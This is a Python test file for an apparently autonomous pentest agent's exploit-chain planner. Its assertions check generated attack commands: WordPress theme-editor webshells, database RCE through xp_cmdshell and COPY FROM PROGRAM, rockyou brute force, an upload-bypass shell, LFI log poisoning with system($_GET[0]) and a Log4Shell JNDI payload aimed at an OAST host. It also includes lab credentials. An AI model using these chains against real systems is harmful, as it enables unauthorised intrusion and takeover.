"""Tier-2 rules from the gap roadmap: unauth/weak DB RCE, WordPress wpscan, SNMP/SMTP user enum, SMB
RID cycling, and one-file privesc CVE version-match. See docs/OFFENSIVE_RULE_GAPS.md."""

from __future__ import annotations

from kryon.intelligence.exploit_chain_planner import (
    _rule_db_unauth_rce,
    _rule_privesc_cve_check,
    _rule_rid_cycle_then_roast,
    _rule_snmp_smtp_user_enum,
    _rule_wordpress_wpscan,
    _rule_wp_admin_webshell,
    plan_next_action,
)
from kryon.intelligence.fact_extractor import ExtractedFacts

H = ("10.0.0.1",)


def test_wp_webshell_fires_with_creds_and_wp_signal():
    f = ExtractedFacts(
        creds=(("admin", "my2boys"),),
        services=((80, "http"),),
        hosts=("10.64.155.236",),
        domains=("internal.thm",),
        paths=("wp-login.php", "/blog/"),
    )
    rec = _rule_wp_admin_webshell(f, [], "active pentest wordpress")
    assert rec is not None
    # uses the discovered vhost (WP redirects the bare IP to it) and drives login→nonce→404.php webshell
    for marker in ("internal.thm", "wp-login.php", "theme-editor.php", "newcontent", "404.php", "uid="):
        assert marker in rec.args


def test_wp_webshell_abstains_without_creds_or_wp():
    # no creds yet → abstain (wpscan must crack first)
    assert (
        _rule_wp_admin_webshell(ExtractedFacts(services=((80, "http"),), hosts=H, paths=("/blog",)), [], "wp") is None
    )
    # creds but no web/WP signal → abstain
    assert (
        _rule_wp_admin_webshell(ExtractedFacts(creds=(("admin", "x"),), services=((22, "ssh"),), hosts=H), [], "ssh")
        is None
    )


def test_wp_webshell_outranks_wpscan_once_cred_is_known():
    # After the scan + wpscan crack, the cred is in facts.creds: the webshell rule must win over a
    # pointless wpscan re-brute (it is registered ahead of _rule_wordpress_wpscan).
    f = ExtractedFacts(
        creds=(("admin", "my2boys"),),
        services=((80, "http"), (22, "ssh")),
        hosts=("10.64.155.236",),
        domains=("internal.thm",),
        paths=("wp-login.php", "/blog/"),
    )
    prior = [": service_scan; nmap 10.64.155.236", ": wp_brute; wpscan WP-SCAN Valid Combinations my2boys"]
    rec = plan_next_action(f, prior, "active pentest wordpress")
    assert rec is not None and "wp_webshell" in rec.args


def test_db_unauth_fires_on_db_ports():
    rec = _rule_db_unauth_rce(ExtractedFacts(services=((3306, "mysql"), (27017, "mongodb")), hosts=H), [], "")
    assert rec is not None and "DB-RCE" in rec.args
    assert "mysql.user" in rec.args and "listDatabases" in rec.args  # mysql dump + mongo
    assert _rule_db_unauth_rce(ExtractedFacts(services=((80, "http"),), hosts=H), [], "") is None


def test_db_unauth_covers_mssql_postgres():
    rec = _rule_db_unauth_rce(ExtractedFacts(services=((1433, "mssql"), (5432, "postgres")), hosts=H), [], "")
    assert "xp_cmdshell" in rec.args and "COPY FROM PROGRAM" in rec.args


def test_wordpress_confirms_then_scans():
    # WP-signal gated: a /blog path (or wp-* marker / prior wordpress finding) must be present.
    wp_facts = ExtractedFacts(services=((80, "http"),), hosts=H, paths=("/blog",))
    rec = _rule_wordpress_wpscan(wp_facts, [], "")
    assert rec is not None and "wp-content" in rec.args and "wpscan" in rec.args
    assert "-e u" in rec.args and "-e vp,vt" in rec.args  # fast user enum + (later) vuln plugins/themes
    # subpath-aware: probes /blog etc., not just the docroot (THM Internal foothold)
    assert "/blog" in rec.args
    # drives the credential brute with rockyou + xmlrpc-multicall (fast enough to crack within the
    # execute_recommendation 120s timeout — my2boys is at rockyou line 3882), not just a hint
    assert "rockyou" in rec.args and "-U /tmp/wpusers.txt" in rec.args
    assert "wp-login" in rec.args and "--max-threads 40" in rec.args
    assert _rule_wordpress_wpscan(ExtractedFacts(services=((22, "ssh"),), hosts=H), [], "") is None


def test_wordpress_wpscan_requires_a_wp_signal():
    """WP-signal gate: a web host WITHOUT any WordPress marker must abstain (so the rule can sit high
    in _RULES without firing on non-WP boxes)."""
    no_wp = ExtractedFacts(services=((80, "http"),), hosts=H, paths=("/admin", "/api"))
    assert _rule_wordpress_wpscan(no_wp, [], "") is None
    # …but a prior wordpress finding (e.g. the deterministic wordpress-detected) is enough to fire.
    assert _rule_wordpress_wpscan(no_wp, ["[wordpress-detected] /blog"], "") is not None


def test_snmp_smtp_enum_fires_on_161_or_25():
    rec = _rule_snmp_smtp_user_enum(ExtractedFacts(services=((161, "snmp"), (25, "smtp")), hosts=H), [], "")
    assert rec is not None and "snmpwalk" in rec.args and "VRFY" in rec.args
    assert "USER-ENUM" in rec.args
    assert _rule_snmp_smtp_user_enum(ExtractedFacts(services=((80, "http"),), hosts=H), [], "") is None


def test_rid_cycle_fires_on_smb_thin_userlist():
    rec = _rule_rid_cycle_then_roast(
        ExtractedFacts(services=((445, "microsoft-ds"),), hosts=H, domains=("thm.local",)), [], ""
    )
    assert rec is not None and "rid-brute" in rec.args and "RID-USERS" in rec.args
    assert "/tmp/users.txt" in rec.args  # feeds the roast
    # abstains when a user list already exists
    fat = ExtractedFacts(services=((445, "smb"),), hosts=H, users=("a", "b", "c", "d", "e", "f"))
    assert _rule_rid_cycle_then_roast(fat, [], "") is None


def test_privesc_cve_version_matches():
    rec = _rule_privesc_cve_check(ExtractedFacts(services=((22, "ssh"),), hosts=H, creds=(("bob", "pw"),)), [], "")
    assert rec is not None and "sshpass -p pw" in rec.args
    for cve in ("CVE-2021-4034", "CVE-2021-3156", "CVE-2022-0847", "CVE-2016-5195"):
        assert cve in rec.args
    assert (
        _rule_privesc_cve_check(ExtractedFacts(services=((445, "smb"),), hosts=H, creds=(("a", "b"),)), [], "") is None
    )


def test_all_abstain_once_run():
    assert _rule_db_unauth_rce(ExtractedFacts(services=((3306, "mysql"),), hosts=H), ["[DB-RCE ...]"], "") is None
    assert _rule_wordpress_wpscan(ExtractedFacts(services=((80, "http"),), hosts=H), ["[WP-SCAN ...]"], "") is None
    assert (
        _rule_snmp_smtp_user_enum(ExtractedFacts(services=((161, "snmp"),), hosts=H), ["[USER-ENUM ...]"], "") is None
    )
    rid = ExtractedFacts(services=((445, "smb"),), hosts=H)
    assert _rule_rid_cycle_then_roast(rid, ["[RID-USERS]"], "") is None
    assert (
        _rule_privesc_cve_check(
            ExtractedFacts(services=((22, "ssh"),), hosts=H, creds=(("a", "b"),)), ["[PRIVESC-CVE ...]"], ""
        )
        is None
    )


def test_file_upload_bypass_plants_and_finds_shell():
    from kryon.intelligence.exploit_chain_planner import _rule_file_upload_bypass

    rec = _rule_file_upload_bypass(ExtractedFacts(services=((80, "http"),), hosts=H), [], "")
    assert rec is not None and "UPLOAD-RCE" in rec.args
    assert "GIF89a" in rec.args and "phtml" in rec.args  # magic-byte + ext bypass
    assert "krsh" in rec.args and "?0=id" in rec.args  # plants + verifies shell
    assert _rule_file_upload_bypass(ExtractedFacts(services=((22, "ssh"),), hosts=H), [], "") is None
    assert _rule_file_upload_bypass(ExtractedFacts(services=((80, "http"),), hosts=H), ["[UPLOAD-RCE x]"], "") is None


def test_lfi_logpoison_confirms_then_poisons():
    from kryon.intelligence.exploit_chain_planner import _rule_lfi_to_logpoison_rce

    rec = _rule_lfi_to_logpoison_rce(ExtractedFacts(services=((80, "http"),), hosts=H), [], "")
    assert rec is not None and "LOGPOISON-RCE" in rec.args
    assert "etc/passwd" in rec.args and "access.log" in rec.args  # confirm LFI then poison log
    assert "User-Agent" in rec.args or "system($_GET[0])" in rec.args
    assert _rule_lfi_to_logpoison_rce(ExtractedFacts(services=((22, "ssh"),), hosts=H), [], "") is None


def test_seimpersonate_fires_on_creds_and_winrm():
    from kryon.intelligence.exploit_chain_planner import _rule_seimpersonate_printspoofer

    rec = _rule_seimpersonate_printspoofer(
        ExtractedFacts(services=((5985, "winrm"),), hosts=H, creds=(("bob", "pw"),)), [], ""
    )
    assert rec is not None and "SeImpersonate" in rec.args and "PrintSpoofer" in rec.args
    # needs both creds AND winrm
    assert _rule_seimpersonate_printspoofer(ExtractedFacts(services=((5985, "winrm"),), hosts=H), [], "") is None
    assert (
        _rule_seimpersonate_printspoofer(ExtractedFacts(services=((22, "ssh"),), hosts=H, creds=(("a", "b"),)), [], "")
        is None
    )


def test_cobalt_strike_beacon_positive():
    from kryon.intelligence.exploit_chain_planner import _rule_cobalt_strike_beacon

    rec = _rule_cobalt_strike_beacon(ExtractedFacts(services=((443, "https"),), hosts=H), [], "")
    assert rec is not None and "CS-TEAMSERVER" in rec.args
    # Detection is cert/JARM based, not the invented X-Request-Type header.
    assert "146473198" in rec.args and "openssl" in rec.args
    assert "X-Request-Type" not in rec.args
    # Confidence must stay well below the 0.92 tool_choice=required gate (evadable signal).
    assert rec.confidence < 0.92
    # No HTTP service → abstain; already-probed → abstain; parametrized path → abstain.
    assert _rule_cobalt_strike_beacon(ExtractedFacts(services=((22, "ssh"),), hosts=H), [], "") is None
    assert _rule_cobalt_strike_beacon(ExtractedFacts(services=((443, "https"),), hosts=H), [": cs_teamserver"], "") is None
    assert (
        _rule_cobalt_strike_beacon(ExtractedFacts(services=((443, "https"),), hosts=H, paths=("/p?id=1",)), [], "")
        is None
    )


def test_exchange_proxylogon_positive():
    from kryon.intelligence.exploit_chain_planner import _rule_exchange_proxylogon

    rec = _rule_exchange_proxylogon(ExtractedFacts(services=((443, "https"),), hosts=H), [], "")
    assert rec is not None and "EXCHANGE" in rec.args
    # Confirms Exchange via banner/OWA build + /ecp reachability, not a generic "auth" grep.
    assert "/owa/auth/logon.aspx" in rec.args and "/ecp/" in rec.args
    assert "authentication|auth|error" not in rec.args
    assert "%{http_code}" in rec.args  # real HTTP status, not the old bogus $?
    # 0.92 exactly forces tool_choice=required (FASE 11.Q) — this heuristic must sit under it.
    assert rec.confidence < 0.92
    assert _rule_exchange_proxylogon(ExtractedFacts(services=((22, "ssh"),), hosts=H), [], "") is None
    assert (
        _rule_exchange_proxylogon(ExtractedFacts(services=((443, "https"),), hosts=H), [": exchange_proxy"], "") is None
    )
    assert (
        _rule_exchange_proxylogon(ExtractedFacts(services=((443, "https"),), hosts=H, paths=("/p?id=1",)), [], "")
        is None
    )


def test_log4shell_positive():
    from kryon.intelligence.exploit_chain_planner import _rule_log4shell

    rec = _rule_log4shell(ExtractedFacts(services=((80, "http"),), hosts=H), [], "")
    assert rec is not None and "LOG4SHELL" in rec.args
    # OAST domain is configurable, no hardcoded callback host.
    assert "KRYON_OAST_DOMAIN" in rec.args
    assert "log4shell.kryon.io" not in rec.args
    # Correctly-quoted JNDI payload: \\$ keeps $ literal so ${jndi..} survives to curl.
    assert "\\${jndi:ldap://$OAST:1389/$TOK}" in rec.args
    assert _rule_log4shell(ExtractedFacts(services=((22, "ssh"),), hosts=H), [], "") is None
    assert _rule_log4shell(ExtractedFacts(services=((80, "http"),), hosts=H), [": log4shell"], "") is None
    assert (
        _rule_log4shell(ExtractedFacts(services=((80, "http"),), hosts=H, paths=("/p?id=1",)), [], "") is None
    )


def test_log4shell_generated_shell_is_valid_and_sends_payload():
    """Regression: the original payload was mangled by broken quoting (`$'${jndi..}'`),
    so `bash -n` failed / nothing was sent. The corrected rule must emit syntactically
    valid bash whose expansion yields a literal ${jndi:...} header value."""
    import subprocess

    import pytest

    from kryon.intelligence.exploit_chain_planner import _rule_log4shell

    # Skip where there's no real bash (e.g. Windows dev boxes where `bash`
    # resolves to the WSL relay stub). The suite runs this on Linux/CI.
    try:
        sanity = subprocess.run(["bash", "-c", "echo ok"], capture_output=True, text=True)
    except (OSError, ValueError):  # pragma: no cover - platform dependent
        pytest.skip("no bash available")
    if sanity.returncode != 0 or sanity.stdout.strip() != "ok":
        pytest.skip("no functional bash available")

    rec = _rule_log4shell(ExtractedFacts(services=((80, "http"),), hosts=H), [], "")
    # Syntax check — no execution.
    syntax = subprocess.run(["bash", "-n", "-c", rec.args], capture_output=True, text=True)
    assert syntax.returncode == 0, syntax.stderr
    # Expansion check: PAY must resolve to a literal JNDI string (no "bad substitution").
    probe = "OAST=example.com; TOK=t; " + 'PAY="\\${jndi:ldap://$OAST:1389/$TOK}"; printf "%s" "$PAY"'
    out = subprocess.run(["bash", "-c", probe], capture_output=True, text=True)
    assert out.returncode == 0 and out.stdout == "${jndi:ldap://example.com:1389/t}"


def test_wpscan_rule_carries_extended_timeout():
    """The full wpscan directive (base-find + user-enum + rockyou brute + vuln enum) clocks ~114s live —
    past the executor's default 120s, which killed it just before the crack landed in the autonomous run.
    The rule must request a longer budget so execute_recommendation doesn't truncate the crack."""
    f = ExtractedFacts(
        services=((80, "http"),),
        hosts=("10.64.155.236",),
        domains=("internal.thm",),
        paths=("wp-login.php", "/blog/"),
    )
    rec = _rule_wordpress_wpscan(f, [": service_scan; nmap"], "active pentest wordpress /blog")
    assert rec is not None
    assert rec.timeout_s is not None and rec.timeout_s >= 240
